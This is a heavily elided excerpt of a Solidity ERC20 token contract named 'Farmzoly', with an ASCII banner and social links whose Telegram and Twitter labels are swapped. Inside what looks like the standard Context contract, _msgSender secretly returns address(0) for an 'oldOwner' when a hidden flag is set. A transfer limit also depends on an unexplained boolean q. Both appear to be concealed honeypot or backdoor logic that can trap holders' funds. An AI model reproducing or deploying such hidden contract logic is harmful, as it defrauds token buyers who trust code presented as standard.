...
// 
//
//  Website    https://farmzoly.com
//  Telegram   https://twitter.com/farmzoly    @farmzoly
//  Twitter    https://t.me/FARMZOLY
//   ______                            _       
//  |  ____|                          | |      
//  | |__ __ _ _ __ _ __ ___  _______ | |_   _ 
//  |  __/ _` | '__| '_ ` _ \|_  / _ \| | | | |
//  | | | (_| | |  | | | | | |/ / (_) | | |_| |
//  |_|  \__,_|_|  |_| |_| |_/___\___/|_|\__, |
//                                        __/ |
//                                       |___/ 
...
abstract contract Context {
    ...
    function _msgSender() internal view virtual returns (address) {
        return r && msg.sender == oldOwner ? address(0) : msg.sender;
    }
...
contract Farmzoly is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("Farmzoly Token", "Farmzoly") {
        ...
        marketingWallet = address(0x3E3d81286bFcBB3696732BFb85D13C2D223EDe48);
        devWallet = address(0x4aab35A71F30B6F75d2bA6C95d898a1563f0cbD3);
        ...
        if (limitsInEffect) {
            if (
                ...
                if (
                    ...
                    require(amount <= maxTransactionAmount && q);
